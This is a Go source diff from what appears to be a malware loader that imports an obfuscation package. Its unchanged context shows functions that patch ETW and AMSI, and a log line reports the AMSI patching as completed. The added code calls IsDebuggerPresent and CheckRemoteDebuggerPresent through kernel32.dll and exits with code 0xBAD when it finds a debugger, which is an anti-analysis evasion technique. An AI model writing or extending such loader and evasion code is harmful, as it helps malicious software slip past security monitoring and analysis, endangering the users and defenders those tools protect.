@@ -9,6 +9,15 @@ import (
 	"loader/pkg/obf"
 	"syscall"
 	"unsafe"
+	"runtime"
+	"os"
+)
+
+var (
+	mk32 = syscall.NewLazyDLL("kernel32.dll")
+	crdp = mk32.NewProc("CheckRemoteDebuggerPresent")
+	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
+	isDebugger  = kernel32DLL.NewProc("IsDebuggerPresent")
 )
 
 func ETW() {
@@ -146,4 +155,49 @@ func AMSI() error {
 	
 	fmt.Printf("[+] AMSI patching completed: %d/%d functions patched\n", patchedCount, len(amsiHashes))
 	return nil
+}
+
+func CheckDebug() {
+	if IsDebuggerPresent() {
+		runtime.GC()
+		runtime.Goexit()
+		os.Exit(0xBAD)
+	}
+	if RemoteDebugger() {
+		runtime.GC()
+		runtime.Goexit()
+		os.Exit(0xBAD)
+	}
+}
+
+// IsDebuggerPresent1 checks if a debugger is present.
+func IsDebuggerPresent1() bool {
+	flag, _, _ := isDebugger.Call()
+	return flag != 0
+}
+
+// IsDebuggerPresent checks if a debugger is present and logs the result.
+func IsDebuggerPresent() bool {
+	if IsDebuggerPresent1() {
+		return true
+	} else {
+		return false
+	}
+}
+// RemoteDebugger checks for the presence of a remote debugger.
+func RemoteDebugger() (bool) {
+	var isremdebpres bool
+	r1, _, err := crdp.Call(^uintptr(0), uintptr(unsafe.Pointer(&isremdebpres)))
+	if r1 == 0 {
+		return false
+	}
+	if err != nil {
+		return false
+	}
+
+	if isremdebpres {
+		return true
+	} else {
+		return false
+	}
 }
